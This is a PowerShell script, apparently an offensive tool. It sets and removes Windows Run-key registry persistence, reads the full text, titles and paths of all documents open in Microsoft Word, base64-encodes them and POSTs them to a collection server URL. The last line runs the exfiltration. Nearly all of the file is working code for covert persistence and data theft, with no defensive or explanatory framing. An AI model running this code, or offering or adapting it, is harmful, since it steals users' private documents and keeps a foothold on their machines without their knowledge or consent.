$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$ServerURL = "http://localhost:8080"

function Set-RegistryPersistence {
<#
.SYNOPSIS
Enables persistence through the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
.PARAMETER Name
Indicates the name to configure the entry in the registry.
.PARAMETER Command
Indicates the command to run in the startup when user log in.
.EXAMPLE
Set-RegistryPersistence -Name "EntryName" -Command "ScriptToExecute"
#>

    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    New-ItemProperty -Path $RegistryPath -Name $Name -Value $Command -PropertyType String -Force | Out-Null
     
}

function Remove-RegistryPersistence {
<#
.SYNOPSIS
Remove persistence through the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
.PARAMETER Name
Indicates the name of the registry entry to delete.
.EXAMPLE
Remove-LocalSecurityPolicy -Name "EntryToDelete".
#>

    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    Remove-ItemProperty -Path $RegistryPath -Name $Name -Force | Out-Null
     
}

function Get-OpenWORDDocumentsWords {
<#
.SYNOPSIS
Retrieve all WinWords open documents, get the title, the document path and exfiltrates all written words in base64
.EXAMPLE
Get-OpenWordDocumentsWords
.PARAMETER URL
Indicates the URL of the server to exfiltrate the data.
#>
    
    Param (       
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $URL
    )

    try {
        $WordDocuments = [Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application')
    }
    catch {

    }
    finally {
        foreach ($WordDoc in $WordDocuments.Documents) {
            
            $Exfil = "##-BEGIN-##" + "`n" + "Word_File: " + $WordDoc.Name + "`n" + "Document_path: " + $WordDoc.FullName + "`n" + "Words: " + "`n"
                    
            foreach ($Word in $WordDoc.Words) {
                if ($null -ne $Word.Text){
                    #clear non ascii chars
                    $Exfil += $Word.Text -replace '[^\x30-\x39\x41-\x5A\x61-\x7A]+', ''
                    $Exfil += " "
                }                
            }

            $Exfil += "`n" + "##-END-##"
            $b  = [System.Text.Encoding]::UTF8.GetBytes($Exfil)
            $EncodedData = [System.Convert]::ToBase64String($b)
            Invoke-Request -URL $URL -Body $EncodedData | Out-Null
        }
    }

    try {
        [Runtime.Interopservices.Marshal]::ReleaseComObject('Word.Application')
    }
    catch {

    }
}

function Invoke-Request {
<#
.SYNOPSIS
Make a POST Request to specified URL to exifltrate data.
.PARAMETER URL
Indicates the URL of the server to make the request.
.PARAMETER Body
Indicates the body of the request
.EXAMPLE
Invoke-Request -URL "ServerURL".
#>

    Param (
                        
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $URL,

        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Body

    )

    Invoke-WebRequest -Method 'Post' -Uri $URL -Body $Body

}

Get-OpenWORDDocumentsWords -URL $ServerURL